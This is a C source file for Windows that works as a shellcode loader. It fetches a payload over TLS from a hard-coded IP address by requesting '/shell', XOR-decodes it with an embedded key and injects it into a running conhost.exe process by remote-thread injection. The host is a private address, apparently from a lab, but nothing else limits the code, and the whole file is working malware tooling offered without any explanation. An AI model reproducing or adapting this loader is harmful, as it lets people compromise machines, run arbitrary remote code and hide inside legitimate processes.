#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#include <tlhelp32.h>
#include <openssl/ssl.h>


#define BUFFER_SIZE 1024

char buffer[BUFFER_SIZE];
char ip[] = "192.168.56.103";
//char ip[] = "10.11.80.155";
int port = 443;


int getProcessId(WCHAR *processName)
{
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot) {
        PROCESSENTRY32W entry;
        entry.dwSize = sizeof(PROCESSENTRY32);
        if (!Process32FirstW(hSnapshot, &entry)) {
            do {
                if (wcscmp(entry.szExeFile, processName) == 0) {
                    return entry.th32ProcessID;
                }
            } while (Process32NextW(hSnapshot, &entry));
        }
    }
    return 0;
}


int downloadHTTPS()
{
    WSADATA WSAData;
    WSAStartup(MAKEWORD(2,0), &WSAData);

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);

    addr.sin_addr.s_addr = inet_addr(ip); //windows

    connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));

    SSL_CTX* ctx = SSL_CTX_new(TLS_method());
    SSL* ssl = SSL_new(ctx);
    
    SSL_set_mode(ssl, SSL_MODE_AUTO_RETRY);
    SSL_set_read_ahead(ssl, 1);

    SSL_set_fd(ssl, sockfd);
    SSL_connect(ssl);
    char* request = "GET /shell\r\n\r\n";
    SSL_write(ssl, request, strlen(request));
    
    int nb = SSL_read(ssl, buffer, BUFFER_SIZE);
    
    closesocket(sockfd);
    WSACleanup();

    return nb;
}

void exploit()
{
    int nb = downloadHTTPS();
    //printf("%d\n", nb);

    char key[] = "YoloSpaceHacker";
    unsigned char shellcode[nb];

    for (int i = 0; i < nb; i++) {
        shellcode[i] = buffer[i] ^ key[i % strlen(key)];
    }

    //explorer.exe conhost.exe  dllhost.exe

    int processId = getProcessId(L"conhost.exe");
    //printf("processId %d", processId);

    HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    PVOID remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
    HANDLE remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
    
    WaitForSingleObject(processHandle, INFINITE);
    CloseHandle(processHandle);

}


int main()
{
    exploit();
    return 0;
}

